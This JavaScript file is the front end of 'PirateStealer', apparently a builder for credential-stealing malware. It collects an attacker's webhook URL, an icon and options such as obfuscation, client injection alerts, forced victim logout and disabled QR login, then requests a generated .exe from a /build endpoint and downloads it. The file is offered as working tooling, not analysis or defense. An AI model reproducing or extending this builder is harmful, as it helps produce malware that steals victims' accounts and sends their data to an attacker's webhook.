var file;

document.getElementById("labelBuild").ondragover = function (evt) {
  document.getElementById("labelBuild").style.border = "2px dotted white";
  evt.preventDefault();
  return true;
};

document.getElementById("labelBuild").ondragleave = function (evt) {
  document.getElementById("labelBuild").style.border =
    "2px dotted rgba(169, 169, 169, 0.2)";
  evt.preventDefault();
  return true;
};

document.getElementById("labelBuild").ondrop = function (e) {
  document.getElementById("labelBuild").style.border = "2px dotted green";

  document.getElementById("uploadicontext").innerHTML =
    e.dataTransfer.files[0].name
      .toString()
      .split(/(\\|\/)/g)
      .pop();
  file = e.dataTransfer.files[0];
  e.preventDefault();
};

document.getElementById("webhookInput").onchange = function (event) {
  if (
    document
      .getElementById("webhookInput")
      .value.match(
        /^(?:(?:https?|ftp):\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,}))\.?)(?::\d{2,5})?(?:[/?#]\S*)?$/i
      ) == null
  ) {
    document.getElementById("webhookInput").style.border = "1px solid #c0181b";
    toastr["error"]("Please, put a valid webhook", "PirateStealer");

    toastr.options = {
      closeButton: true,
      debug: false,
      newestOnTop: false,
      progressBar: true,
      positionClass: "toast-top-right",
      preventDuplicates: false,
      onclick: null,
      showDuration: "300",
      hideDuration: "1000",
      timeOut: "5000",
      extendedTimeOut: "1000",
      showEasing: "swing",
      hideEasing: "linear",
      showMethod: "fadeIn",
      hideMethod: "fadeOut",
    };
  } else {
    document.getElementById("webhookInput").style.border = "1px solid green";
  }
};

document.getElementById("fileInput").onchange = function (event) {
  file = event.target.files[0];
  document.getElementById("labelBuild").style.border = "2px dotted green";
  document.getElementById("uploadicontext").innerHTML = document
    .getElementById("fileInput")
    .value.toString()
    .split(/(\\|\/)/g)
    .pop();
};

document.getElementById("build").onclick = function (event) {
  if (document.getElementById("uploadicontext").innerHTML == "Upload Icon") {
    document.getElementById("labelBuild").style.border = "2px dotted #c0181b";
    toastr["error"]("Please, put an icon", "PirateStealer");

    toastr.options = {
      closeButton: true,
      debug: false,
      newestOnTop: false,
      progressBar: true,
      positionClass: "toast-top-right",
      preventDuplicates: false,
      onclick: null,
      showDuration: "300",
      hideDuration: "1000",
      timeOut: "5000",
      extendedTimeOut: "1000",
      showEasing: "swing",
      hideEasing: "linear",
      showMethod: "fadeIn",
      hideMethod: "fadeOut",
    };

    if (
      document.getElementById("webhookInput").value == "" ||
      document
        .getElementById("webhookInput")
        .value.match(
          /^(?:(?:https?|ftp):\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,}))\.?)(?::\d{2,5})?(?:[/?#]\S*)?$/i
        ) == null
    ) {
      toastr["error"]("Please, put a valid webhook", "PirateStealer");

      toastr.options = {
        closeButton: true,
        debug: false,
        newestOnTop: false,
        progressBar: true,
        positionClass: "toast-top-right",
        preventDuplicates: false,
        onclick: null,
        showDuration: "300",
        hideDuration: "1000",
        timeOut: "5000",
        extendedTimeOut: "1000",
        showEasing: "swing",
        hideEasing: "linear",
        showMethod: "fadeIn",
        hideMethod: "fadeOut",
      };
    }
  } else {
    document.getElementById("webhookInput").style.border = "1px solid green";
    build();
  }
};
if (document.cookie.length < 5) {
  document.cookie.split(";").forEach(function (c) {
    document.cookie = c
      .replace(/^ +/, "")
      .replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
  });
  createCookie("disableqrcode", "true", 3);
  createCookie("obfuscate", "false", 3);
  createCookie("injectNotify", "false", 3);
  createCookie("logoutNotify", "false", 3);
  createCookie("logoutmode", "instant", 3);
  createCookie("embedColor", "#0075FF", 3);
  createCookie("webhookProtect", "true", 3);
}

function createCookie(name, value, days) {
  if (days) {
    var date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    var expires = "; expires=" + date.toGMTString();
  } else var expires = "";
  document.cookie = name + "=" + value + expires + "; path=/";
}

function readCookie(name) {
  var nameEQ = name + "=";
  var ca = document.cookie.split(";");
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == " ") c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}
function ToBool(arg) {
  return arg == "true";
}
function eraseCookie(name) {
  createCookie(name, "", -1);
}

function build() {
  let reader = new FileReader();

  reader.readAsDataURL(file);

  reader.onload = function () {
    var payload = {};
    payload["disableqrcode"] = readCookie("disableqrcode");
    payload["obfuscate"] = readCookie("obfuscate");
    payload["injectNotify"] = readCookie("injectNotify");
    payload["logoutNotify"] = readCookie("logoutNotify");
    payload["logoutmode"] = readCookie("logoutmode");
    payload["embedColor"] = readCookie("embedColor");
    payload["webhookProtect"] = readCookie("webhookProtect");
    payload["webhook"] = document.getElementById("webhookInput").value;
    payload["icon"] = reader.result;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/build", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(payload));
    xhr.onload = function () {
      toastr["success"]("Successfully built your executable.", "PirateStealer");

      toastr.options = {
        closeButton: true,
        debug: false,
        newestOnTop: false,
        progressBar: true,
        positionClass: "toast-top-right",
        preventDuplicates: false,
        onclick: null,
        showDuration: "300",
        hideDuration: "1000",
        timeOut: "5000",
        extendedTimeOut: "1000",
        showEasing: "swing",
        hideEasing: "linear",
        showMethod: "fadeIn",
        hideMethod: "fadeOut",
      };

      location.href = "/builds/" + this.responseText + ".exe";
    };
  };

  reader.onerror = function () {
    console.log(reader.error);
  };
}

particlesJS("particles-js", {
  particles: {
    number: {
      value: 52,
      density: {
        enable: true,
        value_area: 631.3280775270874,
      },
    },
    color: {
      value: "#fff",
    },
    shape: {
      type: "circle",
      stroke: {
        width: 0,
        color: "#000000",
      },
      polygon: {
        nb_sides: 5,
      },
      image: {
        src: "img/github.svg",
        width: 100,
        height: 100,
      },
    },
    opacity: {
      value: 0.5,
      random: true,
      anim: {
        enable: false,
        speed: 1,
        opacity_min: 0.1,
        sync: false,
      },
    },
    size: {
      value: 5,
      random: true,
      anim: {
        enable: false,
        speed: 40,
        size_min: 0.1,
        sync: false,
      },
    },
    line_linked: {
      enable: false,
      distance: 500,
      color: "#ffffff",
      opacity: 0.4,
      width: 2,
    },
    move: {
      enable: true,
      speed: 1.5,
      direction: "bottom",
      random: false,
      straight: false,
      out_mode: "out",
      bounce: false,
      attract: {
        enable: false,
        rotateX: 600,
        rotateY: 1200,
      },
    },
  },
  interactivity: {
    detect_on: "canvas",
    events: {
      onhover: {
        enable: false,
        mode: "bubble",
      },
      onclick: {
        enable: true,
        mode: "repulse",
      },
      resize: true,
    },
    modes: {
      grab: {
        distance: 400,
        line_linked: {
          opacity: 0.5,
        },
      },
      bubble: {
        distance: 400,
        size: 4,
        duration: 0.3,
        opacity: 1,
        speed: 3,
      },
      repulse: {
        distance: 200,
        duration: 0.4,
      },
      push: {
        particles_nb: 4,
      },
      remove: {
        particles_nb: 2,
      },
    },
  },
  retina_detect: true,
});
